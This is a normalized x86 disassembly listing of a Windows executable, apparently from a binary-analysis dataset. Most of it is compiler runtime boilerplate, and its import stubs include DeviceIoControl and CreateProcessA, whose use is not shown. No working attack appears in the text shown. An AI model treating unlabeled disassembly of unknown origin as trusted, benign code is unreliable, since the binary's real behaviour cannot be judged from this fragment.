mov edi [ ebp + 0x8 ]
mov [ ebp - 0x144 ] edi
cmp ebx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call j_sub_4121b0
mov esp ebp
pop ebp
retn
push r--data
call [ LoadLibraryW@IAT ]
test eax eax
je r-xdata
push r--data
push 0x4
push ebx
push edi
call sub_412720
add esp 0x10
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
test esi esi
je r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ esi + 0xc ]
push r--data
push ecx
push r--data
sub edx 0x24
push edx
push r--data
lea edi [ esi + 0x20 ]
push edi
push r--data
push r--data
lea ecx [ ebp - 0x140 ]
push r--data
push ecx
call eax
mov edx [ esi + 0xc ]
sub edx 0x24
push edx
push edi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
call sub_412e00
add esp 0x38
push r--data
lea edx [ ebp - 0x4c ]
push edx
push r--data
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea ecx [ ebp - 0x140 ]
push ecx
call [ lstrlenA@IAT ]
lea edx [ ebp + eax - 0x140 ]
push edx
call [ rw-data ]
mov ecx [ ebp - 0x144 ]
lea eax [ ebp - 0x140 ]
push eax
push 0x4
push ebx
push ecx
call sub_412720
add esp 0x28
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call j_sub_4121b0
mov esp ebp
pop ebp
retn
sub_412e00
mov edi edi
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push edi
xor edi edi
sub eax esi
mov [ ebp - 0x8 ] eax
mov edi edi
cmp edi ecx
jae r-xdata
mov ecx 0x10
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea edx [ ecx + edi * 2 ]
mov [ edi + eax ] 0x0
mov [ edi + edx ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov bl [ eax + esi ]
mov edx [ ebp - 0x4 ]
movzx ecx bl
push ecx
push r--data
push edx
call [ rw-data ]
add [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x8 ]
add esp 0xc
mov [ esi ] bl
inc edi
inc esi
jmp r-xdata
mov ecx [ ebp + 0x14 ]
cmp ecx 0x10
jb r-xdata
sub_412e90
mov edi edi
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0xffffffff
mov eax [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call j_sub_4121b0
mov esp ebp
pop ebp
retn
push ebx
push esi
test eax eax
je r-xdata
mov ebx r--data
mov ecx eax
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
add ecx 0x3a
cmp ecx 0x400
ja r-xdata
lea ebx [ ebp - 0x404 ]
xor ecx ecx
mov dl [ ecx + r--data ]
mov [ ebp + ecx - 0x404 ] dl
inc ecx
test dl dl
jne r-xdata
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push edi
lea edi [ ebp - 0x404 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
mov eax r--data
[ edi ] [ esi ]
mov ecx eax
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ ebp - 0x404 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
jmp r-xdata
mov eax [ rw-data ]
push ebx
push 0x3
push eax
mov eax [ ebp + 0x4 ]
push eax
call sub_412720
add esp 0x10
pop esi
pop ebx
sub_412ff0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
ja r-xdata
or eax 0xffffffff
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ ecx * 4 + rw-data ]
mov [ ecx * 4 + rw-data ] edx
pop ebp
retn
sub_4130a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov ecx [ rw-data ]
mov [ ebp - 0x328 ] ecx
mov edx [ rw-data ]
mov [ ebp - 0x324 ] edx
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_4110f0
add esp 0x4
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov esp ebp
pop ebp
retn
push 0x1
call sub_4110f0
add esp 0x4
sub_413200
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x14 ] 0x19930520
je r-xdata
call sub_4110a0
mov eax 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x14 ] 0x19930521
je r-xdata
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x14 ] 0x19930522
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x14 ] 0x1994000
jne r-xdata
sub_4132a0
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1f
push r--data
push r--data
push r--data
push 0x30000
push 0x10000
push 0x0
call sub_411177
add esp 0xc
push eax
call j_sub_4132f0
add esp 0x18
pop ebp
retn
sub_4132f0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_411186
jmp r-xdata
pop ebp
retn
sub_413350
mov edi edi
push esi
mov esi r--data
mov eax esi
cmp eax r--data
jae r-xdata
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi r--data
jb r-xdata
call eax
sub_413380
mov edi edi
push esi
mov esi r--data
mov eax esi
cmp eax r--data
jae r-xdata
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi r--data
jb r-xdata
call eax
sub_4133b0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push j_sub_4138f0
mov eax [ fs : 0x0 ]
push eax
add esp 0xffffffec
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
push 0x8
call sub_41108c
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov edx [ rw-data ]
push edx
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x24 ] eax
lea ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ EncodePointer@IAT ]
push eax
call sub_4111ea
add esp 0xc
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x1c ]
push ecx
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov edx [ ebp - 0x24 ]
push edx
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413483
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call [ _onexit@IAT ]
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4134e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call j_sub_4133b0
add esp 0x4
neg eax
sbb eax eax
neg eax
sub eax 0x1
pop ebp
retn
sub_413520
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0xbb40e64e
je r-xdata
lea edx [ ebp - 0x8 ]
push edx
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
xor ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] ecx
call [ GetCurrentProcessId@IAT ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
call [ GetCurrentThreadId@IAT ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
call [ GetTickCount@IAT ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x18 ]
push edx
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
xor ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0xbb40e64e
jne r-xdata
mov eax [ rw-data ]
and eax 0xffff0000
je r-xdata
mov edx [ ebp - 0xc ]
and edx 0xffff0000
jne r-xdata
mov [ ebp - 0xc ] 0xbb40e64f
jmp r-xdata
mov ecx [ rw-data ]
not ecx
mov [ rw-data ] ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ rw-data ] ecx
mov edx [ ebp - 0xc ]
not edx
mov [ rw-data ] edx
mov eax [ ebp - 0xc ]
or eax 0x4711
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
mov esp ebp
pop ebp
retn
sub_413660
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx ]
cmp edx 0x5a4d
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
add ecx [ eax + 0x3c ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
cmp [ edx ] 0x4550
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x18
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx ]
cmp edx 0x10b
je r-xdata
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x1
xor eax eax
jmp r-xdata
sub_4136e0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx [ eax + 0x3c ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
movzx eax [ edx + 0x14 ]
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + eax + 0x18 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
movzx eax [ edx + 0x6 ]
cmp [ ebp - 0x8 ] eax
jae r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
cmp edx [ ecx + 0xc ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0xc ]
mov edx [ ebp - 0xc ]
add ecx [ edx + 0x8 ]
cmp [ ebp + 0xc ] ecx
jae r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x28
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_413780
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push j_sub_4138f0
mov eax [ fs : 0x0 ]
push eax
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] __dos_header
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
push eax
call j_sub_413660
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp - 0x1c ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x24 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
call j_sub_4136e0
add esp 0x8
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x2c ]
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x24 ]
and edx 0x80000000
neg edx
sbb edx edx
add edx 0x1
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x34 ]
jmp r-xdata
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x30 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4138f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push j_sub_4121b0
push rw-data
call sub_4111c2
add esp 0x18
pop ebp
retn
sub_413930
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0xc ]
sub esp 0x44
push esi
mov esi [ ebp + 0x8 ]
mov [ eax ] 0x0
push 0x1c
lea eax [ ebp - 0x44 ]
push eax
xor ecx ecx
dec esi
push esi
mov [ edx ] cx
call [ VirtualQuery@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
mov eax [ ebp - 0x40 ]
push ecx
push edx
push eax
call [ GetModuleFileNameW@IAT ]
test eax eax
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x40 ]
mov ecx 0x5a4d
cmp [ edx ] cx
jne r-xdata
mov eax [ edx + 0x3c ]
test eax eax
jle r-xdata
add eax edx
cmp [ eax ] 0x4550
jne r-xdata
movzx ecx [ eax + 0x6 ]
push ebx
push edi
movzx edi [ eax + 0x14 ]
lea eax [ edi + eax + 0x24 ]
sub esi edx
xor edi edi
xor ebx ebx
test ecx ecx
je r-xdata
cmp ebx ecx
je r-xdata
mov edx [ eax ]
cmp esi edx
jb r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
inc ebx
cmp [ rw-data ] 0x0
jne r-xdata
inc ebx
add eax 0x28
cmp ebx ecx
jb r-xdata
mov edi esi
sub edi edx
cmp esi [ eax - 0x4 ]
jb r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
mov edx [ ebp + 0x18 ]
push esi
push esi
lea ecx [ ebp - 0x28 ]
push ecx
push esi
push esi
push esi
push edx
call eax
add esp 0x20
test eax eax
jne r-xdata
call sub_413ca0
mov [ rw-data ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
mov edx [ eax ]
mov [ ebp - 0x1c ] esi
call edx
cmp eax 0x131a5b5
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
call edx
mov eax [ ebp - 0x1c ]
pop edi
pop ebx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x1c ]
lea edx [ ebp - 0x18 ]
push edx
push r--data
push esi
call eax
test eax eax
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
xor esi esi
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push esi
push esi
push esi
lea eax [ ebp - 0xc ]
push eax
push edi
push ebx
call edx
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x38 ]
call edx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] esi
mov eax [ ecx ]
mov eax [ eax + 0x68 ]
lea edx [ ebp - 0x4 ]
push edx
call eax
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x40 ]
call edx
mov ecx [ ebp - 0x4 ]
cmp ecx esi
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
test eax eax
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov edx [ edx + 0xc ]
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
call edx
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov edx [ eax ]
call edx
movzx eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax edi
ja r-xdata
jmp r-xdata
add eax [ ebp - 0x20 ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
cmp eax 0x1fffffff
jae r-xdata
lea ecx [ eax * 8 ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov edx [ edx + 0xc ]
push esi
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x24 ]
push eax
call edx
test al al
je r-xdata
sub edi [ ebp - 0x14 ]
cmp edi [ esi ]
jb r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0x1
cmp ecx eax
jbe r-xdata
mov eax [ esi + eax * 8 - 0x4 ]
mov ecx [ ebp + 0x14 ]
push 0x0
and eax 0xffffff
mov [ ecx ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx ]
mov edx [ edx + 0x70 ]
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call edx
test al al
je r-xdata
cmp edi [ esi + eax * 8 ]
jb r-xdata
mov [ ebp - 0x1c ] 0x1
inc eax
cmp eax ecx
jb r-xdata
sub_413ca0
mov edi edi
push ebp
mov ebp esp
sub esp 0x21c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
push esi
mov esi [ LoadLibraryW@IAT ]
push r--data
mov [ rw-data ] 0x1
call esi
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call j_sub_4121b0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call j_sub_4121b0
mov esp ebp
pop ebp
retn
push r--data
call esi
mov esi eax
test esi esi
jne r-xdata
push edi
mov edi [ GetProcAddress@IAT ]
push r--data
push esi
call edi
mov [ ebp - 0x218 ] eax
test eax eax
jne r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call j_sub_4121b0
mov esp ebp
pop ebp
retn
push ebx
push r--data
push esi
call edi
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call j_sub_4121b0
mov esp ebp
pop ebp
retn
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call j_sub_4121b0
mov esp ebp
pop ebp
retn
push r--data
push esi
call edi
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
push 0x1
push 0x0
push r--data
push 0x80000002
call [ ebp - 0x218 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
mov ecx [ ebp - 0x214 ]
lea edx [ ebp - 0x20c ]
push edx
lea eax [ ebp - 0x21c ]
push eax
push 0x0
push r--data
push ecx
mov [ ebp - 0x210 ] 0x208
call ebx
mov edx [ ebp - 0x214 ]
push edx
mov ebx eax
call edi
push esi
call [ FreeLibrary@IAT ]
test ebx ebx
jne r-xdata
push esi
call [ FreeLibrary@IAT ]
cmp [ ebp - 0x21c ] 0x1
jne r-xdata
mov eax [ ebp - 0x210 ]
test al 0x1
jne r-xdata
shr eax 0x1
cmp eax 0x2
jb r-xdata
dec eax
cmp [ ebp + eax * 2 - 0x20c ] bx
jne r-xdata
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
je r-xdata
or edx 0xffffffff
sub edx eax
cmp edx 0xe
jb r-xdata
mov ecx 0x5c
mov [ ebp + eax * 2 - 0x20c ] cx
inc eax
lea ecx [ eax + 0xd ]
cmp ecx 0x104
ja r-xdata
mov edx [ r--data ]
mov ecx [ r--data ]
lea eax [ ebp + eax * 2 - 0x20c ]
mov [ eax ] edx
mov edx [ r--data ]
mov [ eax + 0x4 ] ecx
mov ecx [ r--data ]
mov [ eax + 0x8 ] edx
mov edx [ r--data ]
mov [ eax + 0xc ] ecx
mov ecx [ r--data ]
mov [ eax + 0x10 ] edx
mov dx [ r--data ]
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] dx
lea eax [ ebp - 0x20c ]
push eax
call [ LoadLibraryW@IAT ]
pop ebx
pop edi
j_sub_4132a0
jmp sub_4132a0
j_sub_413340
jmp sub_413340
j_sub_412fd0
jmp sub_412fd0
sub_411014
jmp DeviceIoControl
sub_41101e
jmp IsDebuggerPresent
j_sub_4117c0
jmp sub_4117c0
j_sub_413380
jmp sub_413380
sub_41102d
jmp WideCharToMultiByte
j_sub_411ff0
jmp sub_411ff0
sub_411037
jmp CloseHandle
j_sub_413090
jmp sub_413090
j_sub_412fc0
jmp sub_412fc0
sub_411046
jmp strncpy_s
sub_41104b
jmp __setusermatherr
sub_411050
jmp Sleep
sub_411055
jmp GetModuleFileNameW
j_sub_413520
jmp sub_413520
sub_41105f
jmp SetUnhandledExceptionFilter
sub_411064
jmp _cexit
j_sub_4134e0
jmp sub_4134e0
sub_411078
jmp MultiByteToWideChar
j_sub_412ff0
jmp sub_412ff0
j_sub_4138f0
jmp sub_4138f0
sub_41108c
jmp _lock
sub_411091
jmp GetProcAddress
j_sub_411f70
jmp sub_411f70
j_sub_4130a0
jmp sub_4130a0
sub_4110a0
jmp ?terminate@@YAXXZ
sub_4110a5
jmp _exit
sub_4110af
jmp _initterm
sub_4110b4
jmp strstr
sub_4110b9
jmp GetCurrentProcess
j_sub_412e90
jmp sub_412e90
j_sub_412180
jmp sub_412180
j_sub_4136e0
jmp sub_4136e0
sub_4110cd
jmp LoadLibraryW
sub_4110d2
jmp HeapSetInformation
sub_4110d7
jmp _configthreadlocale
j_sub_412140
jmp sub_412140
j_sub_412b40
jmp sub_412b40
sub_4110e6
jmp LoadLibraryA
sub_4110eb
jmp RaiseException
j_sub_413660
jmp sub_413660
sub_4110fa
jmp InterlockedCompareExchange
sub_4110ff
jmp GetVersionExA
sub_411104
jmp GetProcessHeap
j_sub_413050
jmp sub_413050
sub_41110e
jmp HeapCreate
j_sub_4133b0
jmp sub_4133b0
j_sub_412610
jmp sub_412610
sub_41111d
jmp HeapFree
j_sub_413020
jmp sub_413020
j_sub_4132f0
jmp sub_4132f0
sub_41112c
jmp TerminateProcess
_start
jmp sub_4122f0
j_sub_413200
jmp sub_413200
j_sub_413280
jmp sub_413280
sub_411140
jmp QueryPerformanceCounter
sub_411145
jmp _unlock
j_sub_412030
jmp sub_412030
sub_41114f
jmp GetCurrentProcessId
sub_411154
jmp __set_app_type
sub_41115e
jmp CreateProcessA
j_sub_411410
jmp sub_411410
sub_411168
jmp EncodePointer
j_sub_413350
jmp sub_413350
j_sub_4118f0
jmp sub_4118f0
sub_411177
jmp _controlfp_s
sub_41117c
jmp GetSystemTimeAsFileTime
sub_411181
jmp DecodePointer
sub_411186
jmp _invoke_watson
j_sub_413930
jmp sub_413930
sub_411190
jmp _CRT_RTC_INITW
sub_411195
jmp GetTickCount
j_sub_413780
jmp sub_413780
sub_41119f
jmp HeapAlloc
sub_4111a4
jmp _amsg_exit
sub_4111a9
jmp LocalAlloc
sub_4111ae
jmp _XcptFilter
sub_4111b3
jmp _CrtSetCheckCount
sub_4111b8
jmp InterlockedExchange
sub_4111bd
jmp UnhandledExceptionFilter
sub_4111c2
jmp _except_handler4_common
j_sub_413330
jmp sub_413330
sub_4111cc
jmp __getmainargs
sub_4111d1
jmp lstrlenA
j_sub_4126b0
jmp sub_4126b0
sub_4111db
jmp WaitForSingleObject
sub_4111e5
jmp exit
sub_4111ea
jmp __dllonexit
sub_4111ef
jmp FreeLibrary
sub_4111f4
jmp _initterm_e
sub_4111f9
jmp CreateFileW
j_sub_413080
jmp sub_413080
sub_4116c4
add eax [ eax ]
add [ eax ] al
int3
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
CreateProcessA
jmp [ CreateProcessA@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
DeviceIoControl
jmp [ DeviceIoControl@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
HeapCreate
jmp [ HeapCreate@IAT ]
CreateFileW
jmp [ CreateFileW@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
memset
jmp [ memset@IAT ]
sub_412180
push 0x1
push 0x1
push 0x0
push 0x0
push 0x0
call sub_411190
add esp 0x14
retn
strncpy_s
jmp [ strncpy_s@IAT ]
strstr
jmp [ strstr@IAT ]
sub_4121b0
cmp ecx [ rw-data ]
jne r-xdata
jmp j_sub_4130a0
retn
sub_4122f0
mov edi edi
push ebp
mov ebp esp
call j_sub_413520
call sub_412310
pop ebp
retn
sub_412504
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov eax [ edx ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
call sub_4111ae
add esp 0x8
retn
sub_412610
mov edi edi
push ebp
mov ebp esp
mov eax [ fs : 0x18 ]
pop ebp
retn
sub_412a24
mov eax 0x1
retn
sub_412ae6
mov eax 0x1
retn
sub_412fc0
mov eax 0x5
retn
sub_412fd0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4
ja r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax * 4 + r--data ]
pop ebp
retn
sub_413020
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] ecx
mov [ rw-data ] 0x0
pop ebp
retn
sub_413050
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] ecx
mov [ rw-data ] 0x0
pop ebp
retn
sub_413080
mov eax [ rw-data ]
retn
sub_413090
mov eax [ rw-data ]
retn
_CRT_RTC_INITW
jmp [ _CRT_RTC_INITW@IAT ]
sub_413280
mov edi edi
push ebp
mov ebp esp
push j_sub_413200
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
pop ebp
retn
_configthreadlocale
jmp [ _configthreadlocale@IAT ]
__setusermatherr
